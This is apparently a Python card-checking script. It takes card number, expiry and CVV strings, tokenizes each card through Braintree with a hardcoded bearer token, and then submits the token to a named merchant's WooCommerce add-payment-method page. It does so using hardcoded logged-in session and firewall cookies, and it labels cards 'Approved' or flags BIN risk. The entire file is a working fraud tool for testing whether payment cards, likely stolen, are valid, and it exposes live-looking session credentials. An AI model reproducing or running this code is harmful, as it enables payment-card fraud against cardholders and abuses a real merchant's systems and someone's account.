def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()

























































	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQ1MjA4MjUsImp0aSI6IjA4NTBmYTYzLTQzMTgtNDhlZS1hYjkyLTM1MDcyNWJjY2VlMyIsInN1YiI6InhmazY4OGgya2J4cmRmaHIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InhmazY4OGgya2J4cmRmaHIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.736ttbtpkje95eOQfxXSLrPkqZOx_IB5LjuGHmTDNB2Log985mroQewlPyx1cnz91glkpvCuS7oPai3-sI6K-g',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '2be027c1-dd0c-4961-bd73-b71dfde158a5',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
#2




	cookies = {
    'cmplz_consent_mode': 'security_storage,functionality_storage,personalization_storage,analytics_storage,ad_storage,ad_user_data,ad_personalization',
    'cmplz_consented_services': '',
    'cmplz_policy_id': '38',
    'cmplz_marketing': 'allow',
    'cmplz_statistics': 'allow',
    'cmplz_preferences': 'allow',
    'cmplz_functional': 'allow',
    '_gcl_au': '1.1.96077920.1733932939',
    '_ga': 'GA1.1.1994752063.1733932940',
    'PHPSESSID': '8119e7c4edc4b125784d5144904c4e0e',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    '_fbp': 'fb.1.1734434242223.686302641403762484',
    'zengar_country': 'usa',
    'wordpress_logged_in_5fd67a3eda9b0a8c6e760c19fdac9623': 'moh5527vbnm%7C1735643894%7CojkTzSSONuNv64yy9b2P0UjENrqAxGyi9uJFhJuEZ3q%7C3137be513c781902615013a4d088434ab38256a65efe8adacd3c67798fb68792',
    'wfwaf-authcookie-fd8d352bf81fdfa7c2f667c58341381a': '15241%7Cother%7Cread%7C5d202d0874787ea8f0c9502b5635f50f4b7083af6f4ac8826d1eeb61805df0f9',
    '_ga_BE2RBLDMMZ': 'GS1.1.1734434241.2.1.1734434422.0.0.0',
}

	headers = {
    'authority': 'neuroptimal.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'cmplz_consent_mode=security_storage,functionality_storage,personalization_storage,analytics_storage,ad_storage,ad_user_data,ad_personalization; cmplz_consented_services=; cmplz_policy_id=38; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; _gcl_au=1.1.96077920.1733932939; _ga=GA1.1.1994752063.1733932940; PHPSESSID=8119e7c4edc4b125784d5144904c4e0e; wordpress_test_cookie=WP%20Cookie%20check; _fbp=fb.1.1734434242223.686302641403762484; zengar_country=usa; wordpress_logged_in_5fd67a3eda9b0a8c6e760c19fdac9623=moh5527vbnm%7C1735643894%7CojkTzSSONuNv64yy9b2P0UjENrqAxGyi9uJFhJuEZ3q%7C3137be513c781902615013a4d088434ab38256a65efe8adacd3c67798fb68792; wfwaf-authcookie-fd8d352bf81fdfa7c2f667c58341381a=15241%7Cother%7Cread%7C5d202d0874787ea8f0c9502b5635f50f4b7083af6f4ac8826d1eeb61805df0f9; _ga_BE2RBLDMMZ=GS1.1.1734434241.2.1.1734434422.0.0.0',
    'origin': 'https://neuroptimal.com',
    'pragma': 'no-cache',
    'referer': 'https://neuroptimal.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'visa',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': 'e0005af349',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post('https://neuroptimal.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)

	text = response.text
	pattern = r'Status code (.*?)\s*</li>'

	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	

